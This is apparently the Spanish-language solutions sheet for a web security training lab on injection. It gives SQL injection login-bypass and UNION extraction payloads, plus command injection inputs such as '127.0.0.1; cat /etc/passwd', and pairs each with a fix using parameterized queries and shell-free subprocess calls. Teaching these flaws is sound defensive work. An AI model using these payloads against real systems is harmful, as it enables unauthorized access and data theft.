# A05 – Inyección: Soluciones

## Reto 1 – SQLi: Bypass de Autenticación
En `/a05/login`, ingresa:
- Usuario: `admin`
- Contraseña: `' OR '1'='1`

La consulta resultante es:
```sql
SELECT * FROM a05_users WHERE username = 'admin' AND password = '' OR '1'='1'
```
El `OR '1'='1'` siempre es verdadero → retorna la primera fila coincidente (admin).

Payloads alternativos:
- Usuario: `' OR 1=1--` / Contraseña: `cualquier cosa`
- Usuario: `admin'--` / Contraseña: `cualquier cosa`

**Corrección:**
```python
user = db.execute(
    "SELECT * FROM a05_users WHERE username=? AND password=?",
    [username, password]
).fetchone()
```

## Reto 2 – SQLi: Extracción UNION
En `/a05/search`, ingresa:
```
' UNION SELECT id,username,password,role FROM a05_users--
```
Esto agrega un segundo SELECT que retorna todos los usuarios (incluyendo la contraseña del admin: `sup3r_s3cr3t`).

**Corrección:** Consultas parametrizadas y lista blanca de campos permitidos en la búsqueda.

## Reto 3 – Inyección de Comandos
En `/a05/ping`, ingresa:
```
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; ls /home
```
El backend ejecuta `ping -c 2 127.0.0.1; id` mediante `shell=True`.

**Corrección:**
```python
import subprocess
# Nunca uses shell=True con input del usuario
proc = subprocess.run(
    ['ping', '-c', '2', host],  # forma de lista, sin shell
    capture_output=True, text=True, timeout=10
)
```
También valida `host` contra una expresión regular estricta: `^[a-zA-Z0-9.\-]{1,253}$`.
